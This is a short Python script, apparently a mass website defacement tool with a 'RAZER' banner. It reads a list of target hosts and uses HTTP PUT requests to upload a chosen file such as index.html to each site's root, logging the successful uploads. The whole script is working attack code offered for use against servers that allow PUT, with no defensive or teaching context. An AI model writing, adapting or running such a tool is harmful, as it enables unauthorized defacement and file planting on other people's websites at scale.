#!/usr/bin/python

import requests
import os
import sys
os.system("clear")

 
print("""\033[91m
\t  ______ _______ ______ _______  ______
\t |_____/ |_____|  ____/ |______ |_____/
\t |    \_ |     | /_____ |______ |    \_
""")
if len(sys.argv) != 3:
    print("\t [!] Usage : " +sys.argv[0]+" target.txt index.html")
    exit()
    
lst = open(sys.argv[1], 'r')
while True:
    sc = open(sys.argv[2]).read()
    suc = open('Result.txt', 'a')
    host = lst.readline().replace('\n', '')
    if not host:
        break
    if not host.startswith('http'):
        host = 'http://' + host
        out = '/'+sys.argv[2]
        print('\t [*] Filename  : '+sys.argv[2])
        print('\t [*] Target    : '+host)
        try:
            r = requests.request('put', host+out, data=sc, headers={'Content-Type':'application/octet-stream'})
        except:
            print('\t Failed    : Null Respone\n')
            pass
            continue
        if r.status_code == 200:
            print('\t [*] Sukses    : '+host+out+'\n')
            suc.write(host+out+'\n')
        else:
            print('\t \033[91m[!] Failed    : '+host+out+'\n')
            
            print("\t \033[34;1m[*]\033[0m Output Saved On : Result.txt")
